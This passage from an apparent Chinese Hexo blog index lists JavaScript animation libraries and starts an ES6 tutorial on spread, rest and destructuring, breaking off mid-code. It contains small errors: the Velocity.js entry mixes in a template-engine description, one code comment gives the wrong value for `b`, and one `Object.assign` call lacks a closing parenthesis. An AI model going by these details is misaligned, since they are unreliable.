体各个子公司。Velocity模板适用于大量模板使用的场景，支持复杂的逻辑运算，包含 本数据类型、变量赋值和函数等功能。还拥有：<strong>颜色动画</strong>、<strong>转换动画(transforms)<strong>、</strong>循环</strong>、 <strong>缓动</strong>、<strong>SVG 动画</strong>、和 <strong>滚动动画</strong> 等特色功能。Velocity.js 支持 Node.js 和浏览器环境。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643878973365-30359de7-cb34-46ca-a66d-ceb270bcadfc.png?x-oss-process=image/resize,w_794,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643878973365-30359de7-cb34-46ca-a66d-ceb270bcadfc.png?x-oss-process=image/resize,w_794,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br />其具有以下特点：<br />●支持客户端和服务器端使用<br />●语法是富逻辑的，构成门微型的语言<br />●语法分析和模板渲染分离<br />●基本完全支持velocity语法<br />●浏览器使用支持模板之间相互引用，依据kissy模块加载机制</p><p>GitHub：<a href="http://github.com/julianshapiro/velocity">http://github.com/julianshapiro/velocity</a><br><a name="OkC3t"></a></p><h1 id="Lax-js"><a href="#Lax-js" class="headerlink" title="Lax.js"></a><br />Lax.js</h1><p>Lax.js 是一款原生零依赖的制作跟随页面滑动的 JavaScript 动画插件，这款插件非常的轻巧，压缩版大小只有3kb。当滑动页面时，帮助创建酷炫的动画效果，比如滚动视差、变形移动等基本的动画效果，响应式兼容方面，比如手机端也有不错的支持。除了可以使用插件默认集成的动画属性，还可以自定义更加丰富的动画属性。<br /><img src="https://cdn.nlark.com/yuque/0/2022/gif/1500604/1643884980168-b3a8b0a1-c68e-4baa-a312-a0b38980223e.gif" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/gif/1500604/1643884980168-b3a8b0a1-c68e-4baa-a312-a0b38980223e.gif" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="E1iPL"></a></p><h1 id="Rellax-js"><a href="#Rellax-js" class="headerlink" title="Rellax.js"></a><br />Rellax.js</h1><p>rellax.js是一款轻量级的纯JavaScript滚动视觉差特效插件。rellax.js压缩后的版本仅871字节，在手机等小屏幕设备中，插件会自动限制视觉差特性。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643880381677-c0de007d-aa39-4a29-af21-bebebb8c939d.png?x-oss-process=image/resize,w_958,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643880381677-c0de007d-aa39-4a29-af21-bebebb8c939d.png?x-oss-process=image/resize,w_958,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="aRJcU"></a></p><h1 id="three-js"><a href="#three-js" class="headerlink" title="three.js"></a><br />three.js</h1><p>three.js 是一个易于使用、轻量级、跨浏览器的通用 JavaScript 3D 库，它是一套基于WebGL 开发出的Javascript 函式库，它提供了比 WebGL 更简单的Javascript API，让开发者能够轻易在浏览器制作 3D 绘图。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643880619524-2e2a1392-ada9-442e-a8bd-ae70c922a005.png?x-oss-process=image/resize,w_957,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643880619524-2e2a1392-ada9-442e-a8bd-ae70c922a005.png?x-oss-process=image/resize,w_957,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="qdhLI"></a></p><h1 id="wow-js"><a href="#wow-js" class="headerlink" title="wow.js"></a><br />wow.js</h1><p>WOW.js 是一款帮助你实现滚动页面时触发CSS 动画效果的插件。它依赖 animate.css，所以它支持 animate.css 多达 60 多种的动画效果，可以改变动画设置喜欢的风格、延迟、长度、偏移和迭代等，能满足各种需求。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643881012619-0815f141-f9ef-4d9e-bdb1-4f42e96a85bc.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643881012619-0815f141-f9ef-4d9e-bdb1-4f42e96a85bc.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="o61TN"></a></p><h1 id="AniJS"><a href="#AniJS" class="headerlink" title="AniJS"></a><br />AniJS</h1><p>AniJS允许我们为网站创建动画样式，而无需任何JavaScript或CSS编码！ 您可以使用简单的<strong>If</strong> - <strong>On</strong> - <strong>Do</strong> - <strong>To</strong>语法用HTML指定所有动画<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643881180295-960b17ec-1a1e-41ec-880b-223d8173a45d.png?x-oss-process=image/resize,w_958,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643881180295-960b17ec-1a1e-41ec-880b-223d8173a45d.png?x-oss-process=image/resize,w_958,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="is0DJ"></a></p><h1 id="Anime-js"><a href="#Anime-js" class="headerlink" title="Anime.js"></a><br />Anime.js</h1><p>Anime.js 是一个轻量的JavaScript 动画库， 拥有简单而强大的API。可对 CSS 属性、 SVG、 DOM 和JavaScript 对象进行动画。它很轻便，gzip压缩完只有9kb左右。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643881400291-d7ddd8b0-062d-4ede-8a58-48d1148fc89b.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643881400291-d7ddd8b0-062d-4ede-8a58-48d1148fc89b.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="uxMR2"></a></p><h1 id="Typed-js"><a href="#Typed-js" class="headerlink" title="Typed.js"></a><br />Typed.js</h1><p>typed.js是一个类型化库，效果是用打字机的方式显示一段话，可以自定义任何字符串、指定显示速度、指定是否循环等。<br /><img src="https://cdn.nlark.com/yuque/0/2022/gif/1500604/1643881755659-578bbdfb-421c-469a-8e9a-b14afdaf932b.gif" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/gif/1500604/1643881755659-578bbdfb-421c-469a-8e9a-b14afdaf932b.gif" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="RtNic"></a></p><h1 id="Vivus"><a href="#Vivus" class="headerlink" title="Vivus"></a><br />Vivus</h1><p>Vivus 是一个轻量级的 JavaScript 库（没有依赖项），它允许我们对 SVG 进行动画处理，使它们看起来像是被绘制的。它有多种不同的动画可用，以及创建自定义脚本的选项，以喜欢的任何方式绘制 SVG。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643881836944-f040f549-034b-4f94-a8ae-f20b9fd9b6d7.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643881836944-f040f549-034b-4f94-a8ae-f20b9fd9b6d7.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="pEZse"></a></p><h1 id="Popmotion"><a href="#Popmotion" class="headerlink" title="Popmotion"></a><br />Popmotion</h1><p>Popmotion 是一个只有12KB的 JavaScript 运动引擎，可以用来实现动画，物理效果和输入跟踪。原生的DOM支持：CSS，SVG，SVG路径和DOM属性的支持，开箱即用。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643881986801-afdd8037-d86f-444f-9419-0a0d24f8e864.png?x-oss-process=image/resize,w_958,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643881986801-afdd8037-d86f-444f-9419-0a0d24f8e864.png?x-oss-process=image/resize,w_958,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="un8xH"></a></p><h1 id="Granim-js"><a href="#Granim-js" class="headerlink" title="Granim.js"></a><br />Granim.js</h1><p>granim.js是一个在网页中创建流畅的交互式流体动画的小型JavaScript库，granim.js可以实现各种想要的渐变的动画效果，使网页色彩更加丰富，视觉效果更佳！<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643882236367-0849eaa1-13f6-48fe-b24e-dae0899e1e29.png?x-oss-process=image/resize,w_956,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643882236367-0849eaa1-13f6-48fe-b24e-dae0899e1e29.png?x-oss-process=image/resize,w_956,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="Klkao"></a></p><h1 id="Kute-js"><a href="#Kute-js" class="headerlink" title="Kute.js"></a><br />Kute.js</h1><p>Kute.js 是一个原生的 Javascript 动画引擎，具有优秀的性能和模块化的代码。 它提供了一大堆工具，以帮助创建自定义动画。它提供了易于使用的方法来设置高性能、跨浏览器的动画。 <br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643882340536-aef0dbd9-af05-4f6f-af2b-4ef464551781.png?x-oss-process=image/resize,w_958,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643882340536-aef0dbd9-af05-4f6f-af2b-4ef464551781.png?x-oss-process=image/resize,w_958,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="vXxCT"></a></p><h1 id="Simple-Parallax"><a href="#Simple-Parallax" class="headerlink" title="Simple Parallax"></a><br />Simple Parallax</h1><p>simpleParallax.js 是一个非常简单且小巧的 Vanilla JS 库，可在任何图像上添加视差动画。它因其易用性和可视化渲染而脱颖而出。视差效果直接应用于图像标签，无需使用背景图像。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643882513364-7682c188-5167-4992-a0a8-f5db2754b31c.png?x-oss-process=image/resize,w_959,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643882513364-7682c188-5167-4992-a0a8-f5db2754b31c.png?x-oss-process=image/resize,w_959,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="PWsjk"></a></p><h1 id="Barba-js"><a href="#Barba-js" class="headerlink" title="Barba.js"></a><br />Barba.js</h1><p>Barba.js是一个小（4kb的压缩和压缩），灵活和无依赖的库，可以帮助您创建流畅和平滑的过渡网站的页面。 它可以减少页面之间的延迟，最大限度地减少浏览器HTTP请求并增强用户的Web体验。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643882962879-d2852eea-27fe-4b78-a603-7d8e90eb01cd.png?x-oss-process=image/resize,w_956,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643882962879-d2852eea-27fe-4b78-a603-7d8e90eb01cd.png?x-oss-process=image/resize,w_956,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="ef9oD"></a></p><h1 id="mo-js"><a href="#mo-js" class="headerlink" title="mo.js"></a><br />mo.js</h1><p>Mo.js是一个简洁、高效的图形动画库，拥有流畅的动画和惊人的用户体验，在任何设备上，屏幕密度独立的效果都很好，可以绘制内置的形状或者自定义形状，还可以绘制多个动画，再让它们串联在一起。<br /><img src="https://cdn.nlark.com/yuque/0/2022/gif/1500604/1643883159339-05c308ba-8dd2-434e-ba44-eb140943be36.gif" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/gif/1500604/1643883159339-05c308ba-8dd2-434e-ba44-eb140943be36.gif" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="h7kd5"></a></p><h1 id="Particles-js"><a href="#Particles-js" class="headerlink" title="Particles.js"></a><br />Particles.js</h1><p>Particles.js 一个轻量级的JavaScript库，用来在网页上创建颗粒效果。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643883928603-4d5f3db8-5cb3-427f-8886-0b8489dca50c.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643883928603-4d5f3db8-5cb3-427f-8886-0b8489dca50c.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="ifwc5"></a></p><h1 id="tsParticles"><a href="#tsParticles" class="headerlink" title="tsParticles"></a><br />tsParticles</h1><p>tsParticles可以轻松创建高度可定制的粒子动画并将它们用作网站的动画背景。可用于 React.js、Vue.js（2.x 和 3.x）、Angular、Svelte、jQuery、Preact、Inferno、Solid、Riot 和 Web 组件的现成可用组件。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643884168246-4419bbf9-0987-4791-8112-6ea30149d884.png?x-oss-process=image/resize,w_958,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643884168246-4419bbf9-0987-4791-8112-6ea30149d884.png?x-oss-process=image/resize,w_958,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="NFmxd"></a></p><h1 id="Rough-Notation"><a href="#Rough-Notation" class="headerlink" title="Rough Notation"></a><br />Rough Notation</h1><p>Rough Notation是一个小型 JavaScript 库，用于在网页上创建和动画注释。它使用RoughJS 创建手绘的外观和感觉。元素可以用多种不同的样式进行注释。动画持续时间可以配置，或者只是关闭。压缩后的大小仅 3.83kb。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643884317111-7c264d54-b4d2-42a3-aeb4-7f62dd42cd78.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643884317111-7c264d54-b4d2-42a3-aeb4-7f62dd42cd78.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="d7wV6"></a></p><h1 id="Animate-on-Scroll"><a href="#Animate-on-Scroll" class="headerlink" title="Animate on Scroll"></a><br />Animate on Scroll</h1><p>Animate on Scroll是一个在页面时创建动画的JavaScript动画库。<br /><img src="https://cdn.nlark.com/yuque/0/2022/gif/1500604/1643884596967-b53dc332-fab0-4580-82d6-fae24ddec22d.gif" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/gif/1500604/1643884596967-b53dc332-fab0-4580-82d6-fae24ddec22d.gif" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="bGCX6"></a></p><h1 id="Framer-Motion"><a href="#Framer-Motion" class="headerlink" title="Framer Motion"></a><br />Framer Motion</h1><p>Motion 是Framer的 React 的生产就绪运动库。它带来了声明性动画、轻松的布局转换和手势，同时保持了 HTML 和 SVG 语义。Motion 使用强大的手势识别器扩展了 React 的事件系统。它支持悬停、点击、平移和拖动。注意，Motion 需要 React 16.8 或更高版本。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1644295728196-2fb91e5e-841c-4a12-a408-4a157e21ecef.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1644295728196-2fb91e5e-841c-4a12-a408-4a157e21ecef.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="ROnvv"></a></p><h1 id="React-Motion"><a href="#React-Motion" class="headerlink" title="React Motion"></a><br />React Motion</h1><p>React Motion 是一个用于 React 应用程序的动画库，可以轻松创建和实现逼真的动画。<br /><img src="https://cdn.nlark.com/yuque/0/2022/gif/1500604/1644296500821-54b8f275-632d-48b4-af76-957aa1c92e88.gif" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/gif/1500604/1644296500821-54b8f275-632d-48b4-af76-957aa1c92e88.gif" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 收藏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 收藏 </tag>
            
            <tag> 动画 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ES6新特性</title>
      <link href="/2019/02/24/frontend/interview/es6-xin-te-xing/"/>
      <url>/2019/02/24/frontend/interview/es6-xin-te-xing/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="Wx6je"></a></p><h1 id="展开运算符和剩余运算符"><a href="#展开运算符和剩余运算符" class="headerlink" title="展开运算符和剩余运算符"></a>展开运算符和剩余运算符</h1><p><a name="LahyN"></a></p><h2 id="展开运算符"><a href="#展开运算符" class="headerlink" title="展开运算符"></a>展开运算符</h2><p>**展开语法,**可以在函数调用&#x2F;数组构造时, 将数组表达式或者string在语法层面展开；还可以在构造字面量对象时, 将对象表达式按key-value的方式展开。(字面量一般指 [1, 2, 3] 或者 {name: “mdn”} 这种简洁的构造方式)</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sum</span>(<span class="params">x, y, z</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> x + y + z;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> numbers = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">sum</span>(...numbers));<span class="comment">//6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(sum.<span class="title function_">apply</span>(<span class="literal">null</span>, numbers));<span class="comment">//6</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a name="ghlNZ"></a></p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p><a name="QGAKj"></a></p><h3 id="等价于apply的方式"><a href="#等价于apply的方式" class="headerlink" title="等价于apply的方式"></a>等价于apply的方式</h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">myFunction</span>(<span class="params">x, y, z</span>) &#123; &#125;</span><br><span class="line"><span class="keyword">var</span> args = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line">myFunction.<span class="title function_">apply</span>(<span class="literal">null</span>, args);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">myFunction</span>(<span class="params">x, y, z</span>) &#123; &#125;</span><br><span class="line"><span class="keyword">var</span> args = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"><span class="title function_">myFunction</span>(...args);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">myFunction</span>(<span class="params">v, w, x, y, z</span>) &#123; &#125;</span><br><span class="line"><span class="keyword">var</span> args = [<span class="number">0</span>, <span class="number">1</span>];</span><br><span class="line"><span class="title function_">myFunction</span>(-<span class="number">1</span>, ...args, <span class="number">2</span>, ...[<span class="number">3</span>]);</span><br></pre></td></tr></table></figure><p><a name="UubqH"></a></p><h3 id="数组拷贝-copy）浅拷贝"><a href="#数组拷贝-copy）浅拷贝" class="headerlink" title="数组拷贝(copy）浅拷贝"></a>数组拷贝(copy）浅拷贝</h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> arr2 = [...arr]; <span class="comment">// like arr.slice()</span></span><br><span class="line">arr2.<span class="title function_">push</span>(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// arr2 此时变成 [1, 2, 3, 4]</span></span><br><span class="line"><span class="comment">// arr 不受影响</span></span><br></pre></td></tr></table></figure><p><a name="jHKuE"></a></p><h3 id="连接多个数组"><a href="#连接多个数组" class="headerlink" title="连接多个数组"></a>连接多个数组</h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr1 = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"><span class="keyword">var</span> arr2 = [<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="comment">// 将 arr2 中所有元素附加到 arr1 后面并返回</span></span><br><span class="line"><span class="keyword">var</span> arr3 = arr1.<span class="title function_">concat</span>(arr2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr1 = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"><span class="keyword">var</span> arr2 = [<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="keyword">var</span> arr3 = [...arr1, ...arr2];</span><br></pre></td></tr></table></figure><p><a name="kMGW4"></a></p><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><p><a name="NdZfB"></a></p><h3 id="操作对象"><a href="#操作对象" class="headerlink" title="操作对象"></a>操作对象</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj=&#123;<span class="attr">id</span>:<span class="string">&#x27;1&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;张三&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">&#123;...obj&#125; <span class="comment">//&#123;id: &#x27;1&#x27;, name: &#x27;张三&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj2=&#123;<span class="attr">type</span>:<span class="string">&#x27;annimal&#x27;</span>,<span class="attr">lang</span>:<span class="string">&#x27;js&#x27;</span>, <span class="attr">sex</span>:<span class="string">&#x27;man&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>(obj,&#123;...obj2&#125; </span><br><span class="line"><span class="comment">//&#123;id: &#x27;1&#x27;, name: &#x27;张三&#x27;, type: &#x27;annimal&#x27;, lang: &#x27;js&#x27;, sex:&#x27;man&#x27;&#125;</span></span><br></pre></td></tr></table></figure><p><a name="ajqzu"></a></p><h2 id="剩余操作符"><a href="#剩余操作符" class="headerlink" title="剩余操作符"></a>剩余操作符</h2><p><strong>剩余参数</strong>语法允许我们将一个不定数量的参数表示为<strong>一个数组。</strong></p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fun1</span>(<span class="params">...theArgs</span>) &#123;</span><br><span class="line">  <span class="title function_">alert</span>(theArgs.<span class="property">length</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">fun1</span>();  <span class="comment">// 弹出 &quot;0&quot;, 因为theArgs没有元素</span></span><br><span class="line"><span class="title function_">fun1</span>(<span class="number">5</span>); <span class="comment">// 弹出 &quot;1&quot;, 因为theArgs只有一个元素</span></span><br><span class="line"><span class="title function_">fun1</span>(<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>); <span class="comment">// 弹出 &quot;3&quot;, 因为theArgs有三个元素</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params">a,b,...arr</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(a);<span class="comment">//1</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(b);<span class="comment">//1</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(arr);<span class="comment">//[ 3, 4 ]</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">fn</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a name="yJxLj"></a></p><h1 id="解构赋值"><a href="#解构赋值" class="headerlink" title="解构赋值"></a>解构赋值</h1><p>解构赋值是对赋值运算符的扩展。<br />他是一种针对数组或者对象进行模式匹配，然后对其中的变量进行赋值。<br />在代码书写上简洁且易读，语义更加清晰明了；也方便了复杂对象中数据字段获取。</p><p><a name="mfqd0"></a></p><h2 id="数组模型的解构"><a href="#数组模型的解构" class="headerlink" title="数组模型的解构"></a>数组模型的解构</h2><p><a name="YzvVM"></a></p><h3 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> [a, b, c] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="comment">// a = 1</span></span><br><span class="line"><span class="comment">// b = 2</span></span><br><span class="line"><span class="comment">// c = 3</span></span><br></pre></td></tr></table></figure><p><a name="XTzbx"></a></p><h3 id="可嵌套"><a href="#可嵌套" class="headerlink" title="可嵌套"></a>可嵌套</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> [a, [[b], c]] = [<span class="number">1</span>, [[<span class="number">2</span>], <span class="number">3</span>]];</span><br><span class="line"><span class="comment">// a = 1</span></span><br><span class="line"><span class="comment">// b = 2</span></span><br><span class="line"><span class="comment">// c = 3</span></span><br></pre></td></tr></table></figure><p><a name="ggpaM"></a></p><h3 id="可忽略"><a href="#可忽略" class="headerlink" title="可忽略"></a>可忽略</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> [a, , b] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="comment">// a = 1</span></span><br><span class="line"><span class="comment">// b = 3</span></span><br></pre></td></tr></table></figure><p><a name="ENMyt"></a></p><h3 id="不完全解构"><a href="#不完全解构" class="headerlink" title="不完全解构"></a>不完全解构</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> [a = <span class="number">1</span>, b] = []; <span class="comment">// a = 1, b = undefined</span></span><br></pre></td></tr></table></figure><p><a name="aOlg8"></a></p><h3 id="剩余运算符"><a href="#剩余运算符" class="headerlink" title="剩余运算符"></a>剩余运算符</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> [a, ...b] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="comment">//a = 1</span></span><br><span class="line"><span class="comment">//b = [2, 3]</span></span><br></pre></td></tr></table></figure><p><a name="MwtAH"></a></p><h3 id="字符串等"><a href="#字符串等" class="headerlink" title="字符串等"></a>字符串等</h3><p>在数组的解构中，解构的目标若为可遍历对象，皆可进行解构赋值。可遍历对象即实现 Iterator 接口的数据。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> [a, b, c, d, e] = <span 